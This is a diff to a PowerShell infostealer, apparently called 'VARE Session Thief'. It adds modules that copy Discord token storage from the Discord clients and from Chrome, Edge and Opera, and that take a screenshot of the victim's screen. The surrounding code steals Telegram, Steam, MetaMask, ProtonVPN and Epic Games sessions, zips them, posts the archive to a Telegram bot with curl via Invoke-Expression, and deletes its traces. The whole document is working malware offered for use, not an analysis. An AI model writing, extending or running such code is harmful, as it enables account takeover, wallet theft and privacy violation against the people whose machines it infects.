@@ -22,6 +22,8 @@ $epicvr = "true" # CHANGE THIS TO "false" FOR DONT STEAL THIS
 $protonvr = "true" # CHANGE THIS TO "false" FOR DONT STEAL THIS 
 $metavr = "true" # CHANGE THIS TO "false" FOR DONT STEAL THIS - LARGE FILE WARNING >.<
 $steamvr = "true" # CHANGE THIS TO "false" FOR DONT STEAL THIS 
+$discordvr = "true" # CHANGE THIS TO "false" FOR DONT STEAL DISCORD
+$screenshotvr = "true" # CHANGE THIS TO "false" FOR DONT TAKE SCREENSHOT
 
 ### VARE SESSION THIEF CONFIG 
 
@@ -56,6 +58,8 @@ $telegram = "Not Found"
 $epicgames = "Not Found"
 $proton = "Not Found"
 $metamask = "Not Found"
+$discord = "Not Found"
+$screenshot = "Not Found"
 
 function hide-me
 {
@@ -297,6 +301,50 @@ function getSteamCookies {
 }
 # ===================================================================
 
+# ========== НОВЫЙ МОДУЛЬ: КРАЖА DISCORD ==========
+function getDiscord {
+    $discordPaths = @(
+        "$env:APPDATA\discord\Local Storage",
+        "$env:APPDATA\discordptb\Local Storage",
+        "$env:APPDATA\discordcanary\Local Storage",
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\*discord*",
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile*\Local Storage\*discord*",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\*discord*",
+        "$env:LOCALAPPDATA\Opera Software\Opera Stable\Local Storage\*discord*"
+    )
+    $discordFolder = "$sessions\Discord"
+    New-Item -ItemType Directory -Path $discordFolder -Force | Out-Null
+    foreach ($p in $discordPaths) {
+        if (Test-Path $p) {
+            Copy-Item -Path $p -Destination $discordFolder -Recurse -Force -ErrorAction SilentlyContinue
+        }
+    }
+    # Проверяем, есть ли что-то
+    if (Test-Path $discordFolder) {
+        $discord = "Found"
+    }
+}
+# ==================================================
+
+# ========== НОВЫЙ МОДУЛЬ: СКРИНШОТ ==========
+function takeScreenshot {
+    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
+    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
+    try {
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+        $bitmap.Save("$main\screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        $screenshot = "Found"
+    } catch {
+        # Если не удалось, просто игнорируем
+    }
+}
+# ==================================================
+
 function startvare {
     hide-me
     pcInfo
@@ -321,10 +369,19 @@ function startvare {
     if ($metavr -eq "true") {
         getmetamask
     }
+    # ---- НОВЫЕ МОДУЛИ ----
+    if ($discordvr -eq "true") {
+        getDiscord
+    }
+    if ($screenshotvr -eq "true") {
+        takeScreenshot
+    }
+    # ---------------------
 }
 
 startvare
 
+# Обновляем статусы с учётом новых модулей
 if (!(Test-Path "$sessions\Telegram.zip")) {} else {
     $telegram = "Found"
 }
@@ -340,7 +397,14 @@ if (!(Test-Path "$sessions\EpicGames.zip")) {} else {
 if (!(Test-Path "$crypto")) {} else {
     $metamask = "Found"
 }
-$sessionscontent = "$vare`n========================================================`n`nTelegram  : $telegram`n`nSteam : $steam`n`nMetaMask : $metamask`n`nProtonVPN : $proton`n`nEpic Games : $epicgames`n`n========================================================"
+if (!(Test-Path "$sessions\Discord")) {} else {
+    $discord = "Found"
+}
+if (!(Test-Path "$main\screenshot.png")) {} else {
+    $screenshot = "Found"
+}
+
+$sessionscontent = "$vare`n========================================================`n`nTelegram  : $telegram`n`nSteam : $steam`n`nMetaMask : $metamask`n`nProtonVPN : $proton`n`nEpic Games : $epicgames`n`nDiscord : $discord`n`nScreenshot : $screenshot`n`n========================================================"
 $sessionscontent > "$main\Sessions.txt"
 
 Compress-Archive -Path $main -DestinationPath "$main.zip" -CompressionLevel Fastest -Force
@@ -349,7 +413,6 @@ Remove-Item $main -Recurse -Force
 $mainpath = "$main.zip"
 $api = "https://api.telegram.org/bot$bottoken/sendDocument"
 
-# ИСПРАВЛЕНО: $chatid вместо $chatId
 $crl = "curl.exe -X POST -H ""content-type: multipart/form-data"" -F document=@'$mainpath' -F chat_id=$chatid $api"
 Invoke-Expression $crl
 Remove-Item "$main.zip" -Recurse -Force
